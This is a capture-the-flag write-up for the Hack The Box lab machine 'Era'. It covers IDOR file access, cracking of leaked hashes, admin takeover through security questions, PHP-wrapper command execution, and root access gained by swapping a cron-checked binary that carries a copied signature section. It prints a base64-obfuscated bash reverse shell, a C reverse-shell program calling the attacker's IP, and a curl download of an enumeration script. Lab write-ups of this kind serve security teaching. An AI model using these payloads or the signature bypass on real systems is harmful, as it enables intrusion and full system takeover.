---
title: "Era HTB Machine Writeup - Complete Exploitation Guide"
seoTitle: "Era HTB Machine: Exploitation Guide"
seoDescription: "Explore the exploitation of the Era HTB machine, covering IDOR vulnerabilities, privilege escalations, LFI, and binary signature manipulation"
datePublished: Tue Sep 02 2025 15:30:40 GMT+0000 (Coordinated Universal Time)
cuid: cmf2pgk1t000a02jl7bf0ad9h
slug: era-htb-machine-writeup-complete-exploitation-guide
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1756752482240/f91994fc-97d9-455c-8106-f71de15b54df.png
ogImage: https://cdn.hashnode.com/res/hashnode/image/upload/v1756752487668/0b973ba9-2878-4d07-bd6a-d0df38e95c23.png
tags: hacking, ctf, hackthebox, cybersecurity-1, ctf-writeup

---

## Overview

Era is a Linux machine from Hack The Box that demonstrates several interesting attack vectors including IDOR vulnerabilities, privilege escalation through security questions, Local File Inclusion (LFI) via PHP wrappers, and a creative privilege escalation using binary signature manipulation.

**Machine Details:**

* **IP:** 10.10.11.79
    
* **OS:** Linux (Ubuntu)
    
* **Difficulty:** Medium
    
* **Attack Vector:** Web Application Vulnerabilities, LFI, Binary Manipulation
    

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756751489534/f2c20f90-6e88-44cf-8e71-29cf3e083976.png align="center")

## Initial Setup

First, let's add the target to our hosts file:

```bash
echo "10.10.11.79 era.htb" >> /etc/hosts
```

## Enumeration Phase

### Port Scanning with Rustscan

Let's start with a comprehensive port scan to identify open services:

```bash
rustscan -a 10.10.11.79 -- -sC -sV
```

**Results:**

```php
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.5
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
```

The scan reveals two open ports:

* **Port 21:** FTP service (vsftpd 3.0.5)
    
* **Port 80:** HTTP service (nginx 1.18.0)
    

### Web Application Analysis

#### Main Website (era.htb)

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756751515482/96c22d6a-d729-45d4-a81c-3ab98cd0fac7.png align="center")

The main website appears to be a static design portfolio. Let's perform directory enumeration:

```bash
dirsearch -u http://era.htb
```

**Discovered directories:**

* `/js/`
    
* `/css/`
    
* `/fonts/`
    
* `/img/`
    

#### Subdomain Discovery

Using ffuf to discover subdomains:

```bash
ffuf -u http://era.htb -H "Host: FUZZ.era.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 4
```

**Found subdomain:** `file.era.htb`

Let's add this to our hosts file:

```bash
echo "10.10.11.79 file.era.htb" >> /etc/hosts
```

#### File Management Application

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756751541913/8ea71202-01b9-4cec-808d-514a1454988e.png align="center")

The subdomain hosts a file management application. Let's enumerate it:

```bash
dirsearch -u file.era.htb -x 403
```

**Key findings:**

* `/login.php` - Login page
    
* `/register.php` - User registration
    
* `/upload.php` - File upload functionality
    
* `/download.php` - File download handler
    
* `/manage.php` - Management interface
    

## Exploitation Phase

### Step 1: User Registration and Access

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756751563037/9ebb67fe-29ec-4bb4-b090-dc1ed3f8455c.png align="center")

Let's create a test account:

* **Username:** test
    
* **Password:** test123
    

After registration, we can log in and access the dashboard:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756751579269/acbae981-119f-4a50-b3b8-a64c050c6708.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756751620126/ee7337cb-c31c-4862-a3ef-db51a6f09384.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756751636583/0e4d622d-a4f6-41c2-8954-f9b9b6b10c2a.png align="center")

### Step 2: IDOR Vulnerability Discovery

The application allows file uploads and provides download links in the format:

```php
http://file.era.htb/download.php?id=5712
```

This suggests an Insecure Direct Object Reference (IDOR) vulnerability. Let's fuzz the ID parameter:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756751657648/4b0d93fa-7c9b-4d0c-92f5-efc7febf5559.png align="center")

### Step 3: Site Backup Discovery

After fuzzing the ID parameter, we discover that `id=54` returns a site backup file. Let's download it:

```bash
wget "http://file.era.htb/download.php?id=54&dl=true"
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756751678565/0158650c-2a19-4ea5-92aa-b90c2745fbf4.png align="center")

### Step 4: Database Analysis

The backup contains several interesting files, including `filedb.sqlite`. Let's examine the database:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756751697646/a6ee96f9-848f-4175-b731-e2a00d585be7.png align="center")

The users table contains password hashes:

**Found hashes:**

```php
eric:$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm
yuri:$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.
admin_ef01cab31aa:$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.
```

### Step 5: Password Cracking

Let's crack these hashes using hashcat:

```bash
# Extract hashes to a file
cut -d ':' -f2 hash.txt > clean_hashes.txt

# Crack using rockyou wordlist
hashcat -m 3200 -a 0 clean_hashes.txt /usr/share/wordlists/rockyou.txt

# Show cracked passwords
hashcat -m 3200 --show clean_hashes.txt
```

**Cracked credentials:**

* `eric:america`
    
* `yuri:mustang`
    

### Step 6: Source Code Analysis

Examining the `download.php` source code reveals a critical vulnerability:

```php
// BETA (Currently only available to the admin) - Showcase file instead of downloading it
} elseif ($_GET['show'] === "true" && $_SESSION['erauser'] === 1) {
    $format = isset($_GET['format']) ? $_GET['format'] : '';
    $file = $fetched[0];

    if (strpos($format, '://') !== false) {
        $wrapper = $format;
        header('Content-Type: application/octet-stream');
    } else {
        $wrapper = '';
        header('Content-Type: text/html');
    }

    try {
        $file_content = fopen($wrapper ? $wrapper . $file : $file, 'r');
        $full_path = $wrapper ? $wrapper . $file : $file;
        // Debug Output
        echo "Opening: " . $full_path . "\n";
        echo $file_content;
    } catch (Exception $e) {
        echo "Error reading file: " . $e->getMessage();
    }
}
```

This code allows administrators to use PHP wrappers for file access, creating a Local File Inclusion (LFI) vulnerability.

### Step 7: Admin Account Compromise

The backup also contains `security_login.php`, which shows a security question bypass mechanism. We can update security questions for the admin account using the yuri user session.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756751736040/630bd412-140b-4073-83d0-76cb023f83ff.png align="center")

Now we can log in as admin using the security questions:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756751770819/79a9628c-12fa-470c-bcbe-459110f7e9bc.png align="center")

**Success!** We're now logged in as admin:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756751815337/1fb3692e-01d5-44aa-8544-973f0a4d0e09.png align="center")

### Step 8: FTP Access and SSL Keys

With the cracked credentials, let's try FTP access:

```bash
ftp era.htb
# Login with yuri:mustang
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756751874764/7646c63b-aa0c-43ef-967d-143bb33f1b89.png align="center")

In the FTP server, we find SSL signing keys in the `/signing` directory:

* `key.pem` - Private key for signing
    
* `x509.genkey` - Certificate generation config
    

### Step 9: Reverse Shell via PHP Wrapper

Since we have admin access, we can use the SSH2 PHP extension to execute commands:

```php
http://file.era.htb/download.php?id=54&show=true&format=ssh2.exec://eric:america@127.0.0.1/bash%20-c%20%27printf%20KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuOTMvOTAwMSAgMD4mMSkgJg|base64%20-d|bash%27;
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756751898139/2324e850-9045-478a-967e-2b8b5c5f88b5.png align="center")

**User flag captured:** `9c6ec6a043e14bb7xxxxxxxxxxxxxxxxx`

## Privilege Escalation

### Step 10: System Enumeration

Let's run linpeas for privilege escalation vectors:

```bash
curl http://10.10.14.93:8000/linpeas.sh > linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Linpeas didn't reveal anything particularly useful for privilege escalation, so we need to do manual enumeration.

### Step 11: Process Monitoring

Using `watch` to monitor running processes:

```bash
watch -n 1 "ps aux --sort=start_time | tail -n 10"
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756751923089/16414941-282d-4c1f-a8ed-7a4341741482.png align="center")

We discover a CRON job running `/root/initiate_`[`monitoring.sh`](http://monitoring.sh) that monitors `/opt/AV/periodic-checks/monitor` and checks its `.text_sig` section for integrity.

### Step 12: Binary Signature Manipulation

The key insight is that the monitoring system checks the `.text_sig` section of the binary. We can:

1. Create a malicious binary
    
2. Copy the original `.text_sig` section
    
3. Replace the monitored binary
    

**Exploit code:**

```c
#include <stdlib.h>
int main() {
    system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.93/9002 0>&1'");
    return 0;
}
```

**Exploitation steps:**

```bash
# Navigate to the monitoring directory
cd /opt/AV/periodic-checks

# Create our malicious code
nano virus.c

# Compile the malicious binary
gcc virus.c -o door

# Extract the original signature section
objcopy --dump-section .text_sig=text_sig /opt/AV/periodic-checks/monitor

# Add the signature to our malicious binary
objcopy --add-section .text_sig=text_sig door

# Replace the original binary
cp door monitor
```

### Step 13: Root Access

When the CRON job runs, it executes our malicious binary, granting us root access:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756751994433/8b5fb05a-978b-485b-b39e-ef062e505298.png align="center")

**Root flag captured:** `24f0f2d439f6afexxxxxxxxxxxxxxxxx`

## Summary

This machine demonstrated several important attack vectors:

1. **IDOR Vulnerability** - Insecure direct object references allowed access to unauthorized files
    
2. **Information Disclosure** - Database backup exposure revealed user credentials and source code
    
3. **Authentication Bypass** - Security questions could be manipulated for admin access
    
4. **Local File Inclusion** - PHP wrapper exploitation through admin-only features
    
5. **Binary Signature Manipulation** - Creative privilege escalation through CRON job exploitation
    

## Key Takeaways

* Always implement proper access controls for file downloads
    
* Secure backup files and don't expose them through web applications
    
* Validate and sanitize all user inputs, especially in file handling operations
    
* Implement proper signature verification that can't be easily bypassed
    
* Regular security audits of CRON jobs and automated processes are essential